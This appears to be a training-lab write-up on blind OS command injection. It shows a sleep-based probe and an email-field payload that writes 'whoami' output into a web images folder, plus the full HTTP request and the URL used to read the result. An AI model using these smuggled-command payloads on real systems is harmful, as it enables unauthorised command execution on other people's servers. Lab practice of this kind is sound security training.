# Lab - 03

Topic :  Blind OS command injection with output redirection

Concept:  Output redirection of blind out command injection into given file

End Goal : running whoami on the server

Analysis : 

- Like the previous lab, we use the payload

```
& sleep 10 #
```

- To find the vuln parameter
- Then we redirect the output to a certain file using the following payload

```
qw@qw.com & whoami > /var/www/images/file.txt # [url encoded]
```

- Burp suite final request

```
POST /feedback/submit HTTP/2
Host: 0a14000103771db6815e9d7f00d6000d.web-security-academy.net
Cookie: session=HEENDxmhM9Vm9VAsLilU484mu5X7gnKj
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 172
Origin: https://0a14000103771db6815e9d7f00d6000d.web-security-academy.net
Referer: https://0a14000103771db6815e9d7f00d6000d.web-security-academy.net/feedback
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

csrf=fFzPnpGstRNyzFoKjGOd0IRVDcA8Ai5e&name=qw%20%26%20sleep%2010%20%23&email=qw%40qw.com%20%26%20whoami%20%3e%20%2fvar%2fwww%2fimages%2ffile.txt%20%23&subject=qw&message=qw
```

- Then we find the url from which the images are loaded

```
https://0a14000103771db6815e9d7f00d6000d.web-security-academy.net/image?filename=4.jpg
```

- Here we change the filename to the one we want.
- In this case it is file.txt
- Final URL to get the output

```
https://0a14000103771db6815e9d7f00d6000d.web-security-academy.net/image?filename=file.txt
```

- And we can see the output and lab is solved.